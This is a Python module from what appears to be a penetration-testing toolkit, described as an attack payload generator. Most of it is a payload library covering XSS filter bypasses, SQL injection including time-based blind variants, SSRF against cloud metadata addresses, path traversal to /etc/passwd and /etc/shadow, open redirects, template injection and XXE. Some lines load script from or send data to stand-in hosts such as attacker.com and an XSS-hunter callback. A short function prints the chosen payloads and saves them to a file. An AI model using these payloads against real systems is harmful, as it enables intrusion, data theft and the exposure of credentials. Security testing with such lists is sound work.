"""
Module 3 — Attack payload generator.
"""

from pathlib import Path

from .utils import (
    info, ok, err, section,
    G, Y, DIM, RST, BOLD,
)

# ── Payload library ───────────────────────────────────────────────────────
PAYLOADS = {
    "xss": {
        "basic": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "<body onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "\"><img src=x onerror=alert`1`>",
            "<input autofocus onfocus=alert(1)>",
            "<details open ontoggle=alert(1)>",
        ],
        "bypass": [
            "<ScRiPt>alert(1)</sCrIpT>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<<script>alert(1)//<</script>",
            "<svg><script>alert(1)</script></svg>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            "<scr\x00ipt>alert(1)</scr\x00ipt>",
            "<script/src=//attacker.com/xss.js>",
        ],
        "blind": [
            "<script src=https://your-xss-hunter.xss.ht></script>",
            "\"><script src=https://your-xss-hunter.xss.ht></script>",
            "'><script src=https://your-xss-hunter.xss.ht></script>",
        ],
    },
    "sqli": {
        "basic": [
            "'", "''", "`", "``", ",", "\"", "\"\"",
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
            "' OR 1=1--", "' OR 1=1#", "1' ORDER BY 1--",
            "1' ORDER BY 2--", "1' ORDER BY 3--",
            "1' UNION SELECT null--", "1' UNION SELECT null,null--",
        ],
        "blind": [
            "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND 1=1--", "1' AND 1=2--",
            "' AND SUBSTRING(username,1,1)='a",
        ],
        "bypass": [
            "' /*!OR*/ '1'='1",
            "'/**/OR/**/1=1--",
            "' %6FR '1'='1",
            "' OORR '1'='1",
            "';%00",
        ],
    },
    "ssrf": {
        "basic": [
            "http://127.0.0.1/", "http://localhost/",
            "http://0.0.0.0/", "http://[::1]/",
            "http://169.254.169.254/",  # AWS metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://100.100.100.200/",  # Alibaba Cloud
        ],
        "bypass": [
            "http://127.1/", "http://0/",
            "http://0x7f000001/", "http://2130706433/",
            "http://127.0.0.1.nip.io/",
            "http://[0:0:0:0:0:ffff:127.0.0.1]/",
            "dict://127.0.0.1:6379/",
            "gopher://127.0.0.1:6379/",
            "file:///etc/passwd",
        ],
    },
    "lfi": {
        "basic": [
            "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
            "../../../../etc/passwd", "../../../../../etc/passwd",
            "/etc/passwd", "/etc/shadow", "/etc/hosts",
            "....//....//etc/passwd", "..%2Fetc%2Fpasswd",
            "..%252Fetc%252Fpasswd",
        ],
        "windows": [
            "..\\..\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "..%5C..%5CWindows%5Csystem.ini",
        ],
    },
    "open_redirect": {
        "basic": [
            "//evil.com", "///evil.com", "////evil.com",
            "https://evil.com", "http://evil.com",
            "/\\evil.com", "//evil.com/%2F..",
            "javascript:alert(1)", "//google.com",
        ],
    },
    "ssti": {
        "basic": [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>",
            "{{7*'7'}}", "#{7*7}", "*{7*7}",
            "{{config}}", "{{self}}", "{{request}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
        ],
    },
    "xxe": {
        "basic": [
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://your-server.com/xxe">]><foo>&xxe;</foo>""",
        ],
    },
}


def run_payloads(vuln_type, category, output_dir):
    section(f"PAYLOADS  →  {vuln_type.upper()} / {category}")

    if vuln_type not in PAYLOADS:
        err(f"Unknown vuln type: {vuln_type}")
        err(f"Available: {', '.join(PAYLOADS.keys())}")
        return

    cats = PAYLOADS[vuln_type]
    if category == "all":
        to_show = cats
    elif category in cats:
        to_show = {category: cats[category]}
    else:
        err(f"Unknown category: {category}")
        err(f"Available for {vuln_type}: {', '.join(cats.keys())}")
        return

    all_payloads = []
    for cat, payloads in to_show.items():
        print(f"\n  {BOLD}{Y}[ {cat.upper()} ]{RST}")
        for i, p in enumerate(payloads, 1):
            print(f"  {DIM}{i:2d}.{RST}  {G}{p}{RST}")
            all_payloads.append(p)

    print(f"\n{ok.__doc__ or ''}")
    ok(f"Total payloads: {len(all_payloads)}")

    if output_dir:
        fname = f"{output_dir}/payloads_{vuln_type}_{category}.txt"
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        with open(fname, "w") as f:
            f.write("\n".join(all_payloads))
        ok(f"Saved → {fname}")

    return all_payloads
